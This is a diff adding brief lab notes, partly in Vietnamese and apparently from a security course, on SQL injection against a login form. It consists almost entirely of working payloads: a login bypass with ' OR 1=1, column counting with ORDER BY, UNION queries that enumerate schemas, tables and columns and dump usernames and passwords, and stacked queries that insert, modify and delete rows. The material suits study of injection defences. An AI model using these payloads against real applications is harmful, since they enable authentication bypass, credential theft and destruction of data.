@@ -1,0 +1,35 @@
+username: admin' ==> lỗi ==> có thể sql injection
+
+- Demo bypass login
+' OR 1 = 1 -- 
+
+- tìm số trường trả về trong câu truy vấn
+- Union attack to find all database
+' OR 1=1 ORDER BY 1; -- 
+' OR 1=1 ORDER BY 2; -- 
+' OR 1=1 ORDER BY 3; -- 
+' OR 1=1 ORDER BY 4; -- 
+==> return 4 columns
+
+- find all schema_name
+' UNION SELECT schema_name, @@version, NULL, NULL FROM information_schema.schemata -- 
+
+- find name of all table in database
+' UNION SELECT table_schema,table_name, NULL, NULL FROM information_schema.tables WHERE table_schema = 'mydb' -- 
+- find name of all columns
+' UNION SELECT column_name, NULL, NULL, NULL FROM information_schema.columns WHERE table_name = 'Users' -- 
+- get data 
+' UNION SELECT username, password, NULL, NULL FROM Users -- 
+
+- Them vao bang Users:
+'; INSERT INTO Users VALUES('admin', 'admin'); -- 
+- Them vao bang students:
+'; INSERT INTO students VALUES(9000, 'nguyen', 'test', 'ATBM'); -- 
+- Sua users:
+'; UPDATE Users Set username='naruto', password='baco' WHERE username='sasuke'; -- 
+- Xoa khoi bang Users:
+'; DELETE FROM Users WHERE username = 'naruto' -- 
+- Xoa khoi bang students:
+'; DELETE FROM students WHERE studentID = 9000; -- 
+
+
